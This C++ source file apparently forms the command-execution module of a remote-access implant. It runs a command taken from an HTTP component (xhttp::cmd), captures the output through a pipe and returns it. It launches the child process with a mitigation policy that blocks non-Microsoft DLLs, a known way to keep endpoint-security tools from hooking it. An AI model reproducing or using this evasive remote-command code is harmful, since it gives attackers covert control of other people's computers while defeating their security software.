#include <winsock2.h>
#include <string>
#include "xhttp.h"
#include <iostream>

namespace command{
std::string createProc() {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    std::vector<BYTE> attributeListBuffer(attributeSize);
    si.lpAttributeList = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(&attributeListBuffer[0]);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON | PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
        return "";

    si.StartupInfo.hStdOutput = hWritePipe;
    si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;

    BOOL s = CreateProcessA(NULL, const_cast<char*>(xhttp::cmd.c_str()), NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
    if (!s) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        DWORD err = GetLastError();
        // Handle error
        // You can use FormatMessage to get error message based on err
        return "";
    }

    CloseHandle(hWritePipe);

    DWORD bytesRead;
    CHAR buffer[4096];
    std::string output;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
        output.append(buffer, bytesRead);
    }

    // Close process handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    std::cerr << output << std::endl;
    return output;
}
}